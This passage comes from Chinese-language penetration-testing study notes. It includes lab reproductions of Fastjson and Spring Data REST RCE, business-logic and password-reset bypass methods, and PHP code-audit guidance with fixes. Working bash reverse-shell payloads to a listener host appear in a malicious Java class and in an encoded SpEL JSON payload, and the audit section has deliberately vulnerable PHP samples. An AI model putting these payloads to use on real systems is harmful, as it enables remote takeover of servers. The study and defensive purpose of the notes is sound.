   import java.lang.Process
    public class fastjsonshell {
        static {
                try {
                    Runtime rt = Runtime.getRuntime();
                    String[] commands = {"/bin/bash","-c", "bash -i >& /dev/tcp/192.168.41.54/8888 0>&1"};
                    Process pc = rt.exec(commands);
                    pc.waitFor();
                } catch (Exception e) {
                    // do nothing
                }
        }
   }
   
   //编译代码
   javac fastjsonshell.java
   ```

   ![恶意类代码](http://113.45.142.235:9001/laffrex/pictures/%E6%81%B6%E6%84%8F%E7%B1%BB%E4%BB%A3%E7%A0%81.png)

3. 拉取工具并使用maven打包

   ```
   git clone https://github.com/mbechler/marshalsec.git
   ```

   ![拉取工具](http://113.45.142.235:9001/laffrex/pictures/%E6%8B%89%E5%8F%96%E5%B7%A5%E5%85%B7.png)

   ![naven打包](http://113.45.142.235:9001/laffrex/pictures/naven打包.png)

4. 在攻击机上开启web服务器监听

   ```
   python -m http.server 4444
   ```

   ![fastjson开启监听](http://113.45.142.235:9001/laffrex/pictures/fastjson%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC.png)

5. 使用工具开启RMI服务器并监听

   ```
   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.167.41.54:9090/#fastjsonshell" 9999
   ```

   ![fastjson开启RMI服务器](http://113.45.142.235:9001/laffrex/pictures/fastjson开启RMI服务器.png)

6. 开启反弹Shell端口监听

   ```
   nc -lvvp 8888
   ```

   ![fastjson开启监听](http://113.45.142.235:9001/laffrex/pictures/fastjson开启监听.png)

7. 抓包，添加payload

   ![抓包](http://113.45.142.235:9001/laffrex/pictures/抓包.png)

8. 成功反弹

****

### 9. Spring Data Set RCE

#### (1). 影响版本

* Spring Data Rest version < 2.5.12,2.6.7,3.0 RC3
* Spring Boot version < 2.0.0M4
* Spring Boot release trains < Kay-RC3

#### (2). 漏洞复现

1. docker部署

2. 检测是否存在漏洞

   ![判断漏洞](http://113.45.142.235:9001/laffrex/pictures/判断漏洞.png)

3. 开启监听

   ![spring开启监听](http://113.45.142.235:9001/laffrex/pictures/spring%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC.png)

4. 抓包，修改数据包

```apl
bash -i >& /dev/tcp/192.168.41.54/1234 0>&1
=>
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQxLjU0LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}
=>
98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,81,120,76,106,85,48,76,122,69,121,77,122,81,103,77,68,52,109,77,81,61,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125

[
	{"op":"replace",
	"path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,81,120,76,106,85,48,76,122,69,121,77,122,81,103,77,68,52,109,77,81,61,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname",
	"value":"vulhub"
	}
]
```

![spring抓包](http://113.45.142.235:9001/laffrex/pictures/spring抓包.png)

5. 成功反弹shell

![spring反弹shell](http://113.45.142.235:9001/laffrex/pictures/spring反弹shell.png)

****

### 10. Log4j

#### (1). 原理

* Log4j2是基于java的日志记录工具，支持JNDI协议

#### (2). 漏洞复现

## 逻辑漏洞

### 1. 定义

* 由于**程序逻辑不严谨或者太过复杂**，导致一些逻辑分支不能正常处理或处理错误，统称为业务逻辑漏洞

### 2. 常见漏洞

> **身份认证安全**、**支付逻辑漏洞**(数据篡改)、
>
> **任意密码找回**、验证码突破、接口调用安全、
>
> **未授权访问**、**权限绕过**

### 3. 业务逻辑安全

#### (1). 身份认证安全

* 有些网站对身份认证模块**没有做好安全防护**，导致漏洞产生

****

##### a. 暴力破解

###### ①测试方法

* 在没有验证码或者一次验证码可以多次使用时

  > 1. 爆破用户名：提示**用户名不存在时**
  > 2. 已知用户名：提示**输入密码错误**
  > 3. 使用一个常用密码：进行**密码喷洒**

###### ②修复方法

> 1. 增加验证码：使用复杂验证码，登录失败变换验证码
> 2. 限制登录频率：超过一定次数后锁定账户
> 3. 二次验证：添加手机验证码或邮箱验证码

****

##### b. 撞库

> 通过手机互联网已泄露的用户和密码信息，生成**对应的字典**，**尝试批量登录其他**网站后，得到一系列可以登陆的用户，通过**部分用户多个网站使用同一个密码**的现象，**对其他网站**进行尝试登录

****

##### c. 身份伪造

###### ①Cookie伪造

1. 测试方法

   > 1. 使用同一个账户登录，找到一个**可以证明身份**的页面
   > 2. 拦截刷新包，观察**Cookie值是否能修改**
   > 3. 数据包放行，页面显示为修改后信息，则存在该漏洞

2. 修复方法

   * 对客户端标识的用户信息采取**Session会话认证**

###### ②Session会话固定攻击

* 诱骗受害者使用**攻击者指定的Session Id**的攻击手段，利用了服务器的session不变的机制

1. 测试方法

   > 1. 攻击者通过某种手段(XSS、嗅探等)**重置用户的Session Id**，然后监听用户会话状态
   > 2. 目标用户携带攻击者设定的Session Id登录站点
   > 3. 攻击者通过Session Id获得合法会话

2. 修复方法

   * 每次登陆成功后**重新生成Session**

****

##### d. 加密测试

* 有些网站在**前端加密**，然后传到**后台直接和数据库里面的值**作对比，这时**抓包并暴力破解**

###### ①测试方法

> 用账号密码**登录，抓包**，查看是否通过**加密方式**对账号密码进行处理

###### ②修复方法

* 将加密**对比的方法**放到**后台去执行**

#### (2). 数据篡改

###### ①业务一致性

> 1. 手机号篡改
> 2. 邮箱和用户名篡改
> 3. 订单ID篡改
> 4. 商品编号更改
> 5. 用户ID篡改

###### ②业务数据安全

> 1. 金额数据篡改
> 2. 商品数量篡改
> 3. 最大数量限制突破
> 4. 本地JS参数篡改

#### (3). 任意密码找回

##### a. 用户凭证暴力破解

* 常见的是找回密码的验证码是**4位**，并且**服务器没有加以限制**，我们可以通过**爆破出验证码**的方式来找回密码

###### ①测试手法

> 1. 验证码的位数：``4 or 6``，验证码有效时间``1min - 15min``
> 2. **验证码爆破**防护绕过

###### ②修复建议

> 1. 增加验证码**复杂性和长度**
> 2. **限制**请求**修改次数**

****

##### b. 返回凭证

###### ①形式

1. url返回凭证
2. 抓包返回凭证
3. 凭证在页面中

###### ②测试方法

> 1. url返回凭证：使用Firefox的firebug**查看请求链接**，看链接中是否有验证码登密码找回凭证
> 2. 抓包直接返回：根据手机号找回密码后**抓包**，验证码直接或加密显示在``verifycode=xxx``中
> 3. 在页面中：通过密保问题找回密码**，查看源码**，问题和答案就在源码中显示

****

##### c. 邮箱弱token

###### ①Unix时间戳+MD5

> * 发现邮箱中重置密码的链接，有字符串被md5加密，解密后类似于1491293277(**10位数字**)，判断为**Unix时间戳**
> * 重置他人密码只需要用他人邮箱发送**重置密码邮件**，在短时间内对**Unix时间戳暴力破解**，即可获得重置密码的链接

###### ②用户名

* 重置密码链接直接使用**用户名进行区别**，改变用户名即可更改他人密码

###### ③服务器时间

> * 利用两个账号同时点击找回密码，去邮箱查看找回密码的链接，发现随机token只相差1-2，即考虑为服务器时间。
> * 利用**一个未知账号**和**一个已知账号**，**同时点击**找回密码，稍微**遍历随机token**，即可构造出未知密码的找回链接

****

##### d. 用户凭证

###### ①短信验证码

> 1. **通过他人手机号**找回密码，抓包，将他人手机号**替换成自己的手机号**，获取验证码，提交后即可修改他人密码
> 2. 通过自己手机号找回密码，抓包，将数据包中的username替换成他人用户名，提交后即可修改他人密码

###### ②邮箱token

* 通过邮箱找回密码，访问链接重置密码，输入**新密码提交时抓包**，虽然有token，但任然可以直接修改用户ID进而修改密码

****

##### e. 重新绑定

###### ①手机绑定

> 1. 给已知账户绑定手机，发现**绑定手机的URL链接中有uid参数**，**修改uid参数为他人**，即可实现将他人账户绑定上自己手机号，从而实现修改密码
> 2. **修改个人资料处抓包**，修改**userid为他人，修改手机号为自己**，即可实现将他人账户绑定上自己手机号，从而实现修改密码

###### ②邮箱绑定

* 通过邮箱找回密码，U**RL链接中修改用户ID为他人**，邮箱不变，之后通过链接将他人账户绑定为自己的邮箱，从而实现修改密码

****

##### f. 服务器验证

###### ①最终提交步骤

* 使用邮箱找回密码，通过**链接到达修改密码页面**，修改密码后提交、抓包，获得**UID参数并修改为他人**，从而实现修改密码

###### ②验证逻辑为空

* 通过密码保护问题找回密码，抓包，将**密保问题删除，直接修改密码**，提交(**密保问题和新密码在同一页面**)

****

##### g. 跳过验证

1. 密码找回页面，先**记住最终修改密码的URL**，再使用他人用户名进行密码找回，但**直接跳转**至最终页面，实现修改密码
2. 修改密码页面抓包，修改其中的`username_cookie`为其他用户，或是将`step`**修改为最终步骤**,从而跳过验证步骤

****

##### h. 本地验证

1. 本地服务器**直接通过**服务器返回的**状态码**进行判断是否成功跳转
2. .发送短信等**验证信息**的动作**在本地执行**，可以通过**修改request**包进行控制

****

##### i. token可控

1. 通过邮箱找回密码，抓包查看提交验证码后的返回数据，有加密字符串，但和后面重新设置新密码URL连接中的加密字符串一样，所以可以利用该加密字符串
2. 根据上面提交验证码的抓包，**修改User**为其他用户(可能存在md5加密)，发送，就可以**返回其他用户的加密字符串**
3. 重新返回到找回密码首页，利用**其他用户找回**，在输入验证码处直接**修改URL链接，加入加密字符串**，可以直接绕过验证码

****

##### j. 注册覆盖

* 注册**重复的用户名**，能够注册成功，相当于修改了密码

****

##### k. Session覆盖

* 同一浏览器，首先输入**自己的账户**进行邮箱密码找回，**进入邮箱查看链接**，接着输入**他人账户**，进行密码找回，**返回**刚刚**自己的邮箱点击链接**，由于**Session覆盖**导致了，这个**链接成为了修改他人密码的链接**，从而修改他人密码

****

#### (4). 验证码突破

##### a. 暴力破解验证码

###### ①方法

> 1. 有的验证码输入正确一次，在一定的时间内不用再次输入
> 2. 有的验证码输入正确一次，会在session中设定一个值，告诉用户你已经通过了验证码验证
> 3. 逻辑颠倒，先对比账号密码是否正确，在对比验证码是否正确

###### ②修复建议

> 1. 提要验证码的长度、复杂度
> 2. 限制错误登录次数、有效时间

****

##### b. 时间、次数突破

* 重复提交携带验证码的数据包，查看返回包，判断次数

###### ①测试方法

* 抓取正确登录信息的数据包**，重复提交该数据包**，查看是否登录成功，登陆成功则存在验证码重复使用问题

****

##### c. 回显测试

* 验证码直接由客户端生成，在回显中显示，可通过浏览器工具直接查看

###### ①测试方法

> 1. 在源码中显示：源代码审计
> 2. 在Cookie中显示：抓包时分析Cookie中是否有验证码

****

##### d. 绕过测试

* 逻辑设计缺陷，比如**直接删除COOKIE或验证码参数**可绕过，当**验证不通过清空session**时，**验证码参数为空**时绕过等

###### ①测试方法

> 1. 抓包，删除验证码字段看是否可以成功发送
> 2. 正常流程中记录验证码后的数据包，替换目标中的内容，直接发送，查看是否可以直接绕过验证码

****

#### (5). 接口调用安全

##### a. 重放攻击

* 在**短信、邮件调**用业务或**生成业务**数据环节中(短信验证码、邮件验证码、订单生成、评论提交等)，对其业务环节进行**调用(重放)测试**

###### ①分类

* 短信轰炸
* 恶意注册

###### ②修复

> 1. 对评论提交等操作**采用验证码机制**，防止生成数据业务被恶意调用
> 2. 短信/邮件接口，需要**对接调用频率进行控制**或者上限限制
> 3. 每一个订单(接口访问)使用**唯一的token**，提交一次后token失效

****

##### b. 内容编辑

* 点击获取短信验证码，**抓包可以修改短信内容**，实施下一步攻击

###### ①修复

* 从客户端获取手机号、邮箱等账号信息，要与Session中的凭证进行核验，验证通过后才允许进行业务操作

****

##### c. 接口调用遍历

* 通过接口**传入id参数，返回对应id的信息**，如果接口请求**合法性校验不严**，很容易出现**非授权访问或越权访问**

###### ①修复

> 1. 在session中存储当前用户的凭证或id，只有**传入凭证或id值与session一致时**才返回结果
> 2. 涉及**身份校验的接口，不要直接明文传输**，可以将敏感信息在服务端关联到用户标识ID，在客户端保存用户标识ID并提交到服务端，服务端根据ID取出对应信息后进行校验

****

##### d. 接口未授权

* 敏感功能的接口需要对访问者的身份进行验证，验证通过后才允许调用此接口。若接口未做身份验证或校验不严，可能会导致非授权访问或者越权调用

###### ①修复

> 1. 采用**Token一次性校验**的方式，只有Token验证通过才返回接口数据
> 2. 接口被调用时，服务端**对会话状态进行验证**，如果已登录则返回接口数据，否则返回自定义错误信息
> 3. **未授权访问接口做session认证**，并对用户访问的**每一个URL做身份鉴别**，正确的校验用户id及token等
> 4. 服务器端需**校验身份唯一性**，访问**接口来源验证**，不同身份只能增删改查自己的信息

****

### 4. 业务授权安全

* 授权是指是对**特定资源的读写权限**

#### (1). 未授权

* 用户**未通过认证授权**的情况，能够**直接访问需要通过认证**才能访问到的页面或信息

****

#### (2). 越权

* 开发人员在对数据进行操作时**对客户端请求的数据过分相信**而**遗漏了**权限的判定

##### a. 发生位置

1. 修改、重置、找回账户密码
2. 查看、修改其他账户未公开的信息，例如个人资料、文件、数据、程序等
3. 与账户关联的权限操作

****

##### b. 分类

![越权漏洞分类](http://113.45.142.235:9001/laffrex/pictures/越权漏洞分类.png)

###### ①水平越权

* 相同权限的不同用户可以互相访问

###### ②垂直越权

* 权限低的用户可以**访问权限较高**的用户，或者权限较高(非管理员)用户可以查看大量低权限用户详细信息

****

##### c. 检测

1. 查看所有涉及到账户操作是否有**除了UID之外的验证**方式，没有则构造UID(username,email,userid等)访问
2. 如果有**验证参数**，能**预知或猜取**，则存在漏洞

****

##### d. 修复方法

> 1. 所有涉及到用户信息的操作需要**验证用户身份**
> 2. 特别敏感的操作应该进行**二次验证**

## 代码审计

### 1. 定义

* 根据应用程序源代码，从结构、脆弱性以及缺陷等方面进行审查，最终输出代码审计报告，完善应用程序，提高自身安全水平

### 2. 工具

#### (1). 辅助工具

1. Notepad++编辑器
2. Seay源码审计系统

#### (2). 其他工具

##### a. UltraEdit

* 轻量级代码编辑器，支持十六进制查看及编辑，可**直接修改exe等文件**，支持打开大文件，可直接执行代码

##### b. ZendStudio

* 内置一个强大的**php代码调试**工具，代码**提示功能强大**，支持6种以上语言。

##### c. RIPS(代码审计工具)

* 使用简单，可以**自动生成漏洞利用payload**
* http://rips-scanner.sourceforge.net/

##### d. Burpsuite

##### e. 浏览器扩展

##### f. 编码转换及加解密

* seay代码审计系统**自带编码**，burp的Decoder功能

##### g. 正则调试功能

* seay、灵者正则调试

### 3. 流程

1. 获得源码
2. 安装环境
3. 查看网站结构
   * 了解该程序的大致目录
4. 查找程序入口
   * 了解程序的业务逻辑
5. 寻找配置文件
   * 类似于config.php的文件，保存数据库相关信息,查看**数据库编码方式**(宽字节注入)以及变量**引用方式**(双引号执行)
6. 过滤功能
   * 通过**公共函数**文件和**安全过滤**等文件，了解过滤位置、绕过方式、过滤方式(GPC、正则、替换、addslasher)

### 4. 方法

1. 通读源码
   * 应用文件结构 => 关键文件代码 => 配置文件 => 首页文件 => 入口文件 => 功能审计
2. 定向功能分析法
   * 分析程序有哪些功能，**根据功能**进行漏洞检测与测试
3. 敏感函数参数回溯

### 5. 配置项和危险函数

#### (1). 配置项

* **php.ini**配置项规定了**各种环境的条件**

| 模式           | 设定范围                                          |
| -------------- | ------------------------------------------------- |
| PHP_INI_USER   | 用户脚本(例如ini_set())、注册表(5.3起)、.user.ini |
| PHP_INI_PERDIR | php.ini、.htaccess、httpd.conf                    |
| PHP_INI_SYSTEM | php.ini、httpd.conf                               |
| PHP_INI_ALL    | 可在任何地方设定                                  |

#### (2). 常见配置

##### a. register_global

1. 作用

   * 设定全局变量的自动注册，**默认关闭**

2. 版本特性

   * 自5.3.0废弃，5.4.0移除，5.2.0中默认开启

3. 配置影响

   * **变量覆盖漏洞**，既可以成为下文**绕过身份认证**的方法，也可以突破其他已保护的变量**产生新漏洞**，如sql注入

4. 不安全实例

   ```php
   <?php
   	$username=$_GET['username'];
   	$password=$_GET['password'];
   	if(($username==='admin')&&($password==='123456')){
         $authorized=true;//可以通过[URL]?authorized=1,直接传入authorized变量的值进行覆盖从而任意用户登录
       }
   ?>
   ```

##### b. safe_mode

* 相似配置还有：safe_mode_exec_dir、disable_classes=、disable_functions=fopen、unlink

1. 作用

   * 禁用了php的一些危险的内置函数，如system、exec等，**默认关闭**

2. 版本特性

   * 自5.3.0废弃，5.4.0移除

3. 配置影响

   * 在找到**可执行命令**时，可以**先检测环境的配置**

4. 不安全实例

   ```php
   <?php
   	$commend=$_GET['commend'];
   	system("{$commend}");
   ?>
   ```

##### c. display_error

1. 作用

   * 将显示php产生的错误，**默认开启**

2. 版本特性

   * 在php中默认开启，但是真实的站点发布后一般是关闭的

3. 配置影响

   | 报错设置项            | 含义                                       |
   | --------------------- | ------------------------------------------ |
   | error_reporting=E_ALL | 将错误级别显示为最高                       |
   | error_log= [path]     | 自定义错误日志的位置，必须对web用户可写入  |
   | log_errors=on         | 将错误日志输出到文件，而不是直接输出到前端 |

4. 不安全实例

   ```
   站点关闭后未关闭display_error，呢么就会暴露服务器的目录信息，增加sql注入的风险
   ```

### 6. 危险函数

![危险函数](http://113.45.142.235:9001/laffrex/pictures/危险函数.png)



### 7. 类型

#### (1). 安装漏洞审计

##### a. 概述

* 一般php程序都有一个初始安装的功能，可能有以下漏洞

  1. 无验证功能，任意重装覆盖

  2. $_GET['step']跳过限制步骤

  3. 变量覆盖导致重装

  4. 判断lock后跳转无exit

  5. 解析install.php.bak漏洞

  6. 其他特定功能绕过漏洞

     ![安装漏洞](http://113.45.142.235:9001/laffrex/pictures/安装漏洞.png)

##### b. 审计思路

1. 定向功能分析法，直接从安装问题找漏洞

2. 判断Lock后面有没有exit()，如果没有，看代码重装部分有什么漏洞

   ![安装漏洞审计思路](http://113.45.142.235:9001/laffrex/pictures/安装漏洞审计思路.png)

#### (2). 命令注入漏洞

##### a. 分类

1. 可以直接传入命令执行并返回结果
   * system()、exec()、shell_exec()、passthru()、反引号
2. 可以传入命令执行，但无结果返回
   * popen()、proc_open()
3. 需要开启pcntl扩展
   * pcntl_exec()

##### b. 函数作用

![RCE函数作用](http://113.45.142.235:9001/laffrex/pictures/RCE函数作用.png)

##### c. 多命令执行语法

###### ①windows

| 命令格式                 | 含义                                           |
| ------------------------ | ---------------------------------------------- |
| command1**&**command2    | 先后执行，无论command1是否成功                 |
| command1**&&**command2   | 先后执行，command1成功，才执行command2         |
| command1**\|\|**command2 | 先后执行，command1失败，才执行command2         |
| command1**\|**command2   | \|是管道符，将command1的执行结果传递给command2 |

###### ②Linux

| 命令格式                 | 含义                                       |
| ------------------------ | ------------------------------------------ |
| command1**;**command2    | 先后执行，无论command1是否成功             |
| command1**&&** command2  | 先后执行，command1成功，才执行command2     |
| command1**&**command2    | 先执行command1并放置后台，在执行command2   |
| command1**\|\|**command2 | 先后执行，command1失败，才执行command2     |
| command1**\|**command2   | 管道符，将command1的执行结果传递给command2 |

##### d. 审计思路

* 搜索目标函数 => 分析过滤 => 构造恶意字符串 => 执行 => 根据返回值判断 

#### (3). XSS漏洞审计

##### a. 相关函数

* echo、printf、print、print_r、sprintf、die、var_dump、var_export等

##### b. 审计思路

###### ①反射型、存储型

* 需要跟踪**输入输出位置**是否有过滤

* 搜索输出函数 => 寻找是否有js代码 => 是否过滤，绕过 => 重复

  ```php
  1. 反射型：
  <?php
      $content = $_GET['content'];
      //没有做任何过滤
      echo $content;	//输出函数
  ?>
      
  2. 存储型：
      <?php
      $xss=$_POST['xss'];//没有做任何过滤
      if($xss!==null){
          $sql="insert into temp(id,payload) value('1','$xss')";
          $result=mysql_query($sql);
          echo $result;//输出函数
      }
  ?>
  ```

###### ② DOM型

* 要对js做审计，查看是否是直接输出的js代码

##### c. 漏洞修复

###### ①简单修复

* 使用**htmlspecialchars()**函数，将内容转化为HTMl实体

* ```php
  $sql = "INSERT INTO 'test'('name') VALUES('".htmlspecialchars($name)"')";
  $result=mysql_query($sql);
  echo $result; 
  ```

###### ②严格限制输入

* 以输入ip地址为例

  ```php
  if(is_numeric($octet[0]))&&(is_numeric($octet[1]))&&(is_numeric($octet[2]))&&(is_numeric($octet[3]))&&(sizeor($octet)== 4)){
  $target=$octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];
  }
  ```

#### (4). SQL注入漏洞

##### a. 相关类型

* 数字型注入、字符型注入、宽字节注入、编码注入、二次注入等

##### b. 审计思路

* 是否存在**过滤函数** => **addslashes**(字符型无法注入) => set **character_set_client=gbk**(宽字节)

  ![SQL注入审计思路](http://113.45.142.235:9001/laffrex/pictures/SQL注入审计思路.png)

###### ①普通注入

> 1. 观察sql语句的拼接，是否**对用户的输入进行处理**
>
> 2. 寻找数据库关键字`select from`、`mysql_connect`等
>
>    * 搜索$query => 查看输入函数是否有过滤 => 查找数据库关键词 => 重复
>
>    ```php
>    $id = $_REQUEST['id'];
>    $query = "SELECT * FROM users WHERE id = $id";
>    echo $query;
>    ```

#### (5). 文件包含漏洞

##### a. 产生原因

* 服务器对要包含的来源文件没有进行审查，导致攻击者进行了任意文件的读取等危害

##### b. 原理

> * 服务器开启了allow_url_include选项
> * 利用php的某些特性函数，利用URL动态包含文件

##### c. 相关函数

* include、include_once、require、require_once

  ![文件包含漏洞介绍](http://113.45.142.235:9001/laffrex/pictures/文件包含漏洞介绍.png)

##### d. 审计思路

> 1. 跟踪程序运行流程，查看模块加载时包含的文件**是否可控**
> 2. 直接**搜索相关函数**，**回溯查看**变量是否可控

##### e. 漏洞修复

> 1. 尽量不要使用动态变量调用文件，**直接写要包含的文件**
> 2. 进行**白名单匹配**，但大型web维护起来很复杂

#### (6). 二次注入漏洞

##### a. 原理

* 利用Mysql数据库出库值**反转义**功能，**多次与数据库交互**造成的注入问题

##### b. 相关函数

> 1. 在数据库**第一次进入数据库时**进行了转义后再存储，后续使用时**未再次过滤或转义**而直接使用
> 2. 开发者对语言中的**函数理解不充分**导致，例如**is_numeric**

##### c. 审计思路

> 1. 有数据**insert/update**到数据库
> 2. 从数据库**select**数据，**没有再次转义**，再将数据**拼接**到新的语句中

##### d. 防御和修复

> 1. 正则过滤输入
>
>    ```php
>    if(!preg_match("/^[a-zA-Z0-9]+$/",$clean_name))
>    ```
>
> 2. 出库时数据过滤

#### (7). 任意文件读取

##### a. 原理

> 1. 都具有**读取文件的函数**
> 2. 读取文件的**路径用户可控**，且**没有校验**或者**校验不严格**
> 3. 都会**输出文件内容**

##### b. 相关函数

* file_get_contents()、fgetss()、fgets()、file()、fopen()、fread()、parse_ini_file()、readfile()、show_source()、highlight_file()

  ```php
  <?php 
  	$filename=$_GET['file'];
  	echo file_get_contents($filename);
  ?>
  ```

##### c. 审计思路

> 1. 先查看**功能点对应的文件**，再去进行代码审计，分析原理
> 2. 搜索文件读取的相关函数，用**变量溯源**的方法，查看是否可以**直接或间接控制变量**

##### d. 防御与修复

> 1. 尽量将**url写死**
> 2. **正则判断**用户输入的参数格式，匹配输入的格式是否合格
> 3. 少使用敏感函数，**控制敏感函数传参**
> 4. 对**变量进行过滤**，将单引号或者其他敏感字符转化为斜杠

#### (8). 任意文件操作

##### a. 原理

* 文件操作相关**关键参数用户可控**，导致的恶意操作

##### b. 分类

###### ①文件/目录删除	

1. 相关函数

   > 1. **unlink(路径)**：删除文件
   >
   > 2. **rmdir(路径)**：删除目录

2. 相关手法

   > 1. 删除lock**文件锁**，导致重复安装漏洞
   >
   > 2. 删除网站**关键文件**，导致数据丢失或网站拒绝服务

###### ②文件写入/上传

1. 相关函数

   > 1. file_put_contents(dir,content)：直接将字符串写入文件
   >
   > 2. $fp=fopen(dir,"w")：以写入模式打开一个文件
   >
   > 3. fwrite($fp,content)：向文件写入数据
   >
   > 4. fclose($fp)：关闭文件
   >
   > 5. move_uploaded_file(tmp_dir,des_dir)：移动临时上传的文件

###### ③文件解压

1. 审计思路

   * ZipArchive扩展在windows平台php>5.6默认安装

   > 1. 查看是否有文件解压类，例如`$zip = new \ZipArchive`
   >
   > 2. 查看是否有相关操作函数，例如`$zip->open()`、`$zip->addFile()`、`$zip->addEmptyDir()`、`$zip->addFromString()`、`$zip->extractTo()`、`$zip->close()`
   >
   > 3. 判断解压目录 
   >
   > 4. 是否在web目录下
   >
   >    1. 是否检查压缩包内的文件类型
   >
   >    2. 是否不在web目录下也可以使用

##### c. 常见函数及用法

![任意文件操作漏洞](http://113.45.142.235:9001/laffrex/pictures/任意文件操作函数1.png)

![任意文件操作函数2](http://113.45.142.235:9001/laffrex/pictures/任意文件操作函数2.png)

#### (9). 越权漏洞

##### a. 常出现地方

> 1. 根据订单号查订单
> 2. 根据用户ID查看账户信息
> 3. 修改/找回密码

##### b. 思维导图

![越权漏洞思维导图](http://113.45.142.235:9001/laffrex/pictures/越权漏洞思维导图.png)

##### c. 审计思路

> 1. 先查看**前端的页面源码**，查看一些操作的**表单提交的值**
> 2. 查看**配置文件**和一些**过滤器**，是否对**URL**有相关的**筛选操作**
> 3. 最后查看**后台处理逻辑**，是否存在**身份验证机制，逻辑是否异常**
> 4. 查看服务器端是否进行**身份校验**

##### d. 修复和防御

> 1. 查看用户信息操作需要**额外的身份验证信息**
> 2. 从**加密的Cookie中**获取当前用户id
> 3. 在每个页面**加载前**进行权限认证
> 4. 进行敏感操作时**再次验证身份信息**

#### (10). 暴力破解

##### a. 原理

* 穷举法

##### b. 审计思路

* 分别审计登录页面、验证码页面、二维码页面，判断二维码是否可以绕过

##### c. 防御与修复

> 1. 每次进行身份校验时，**调用二维码的文件**，从而刷新验证码
> 2. 添加一个**判断session不为null**的条件
> 3. 前端验证码**加密**，或使用**高级验证码**
> 4. 后台对用户输入密码**次数进行限制**，或**封禁**失败次数过多的IP
> 5. 禁止用户使用弱口令密码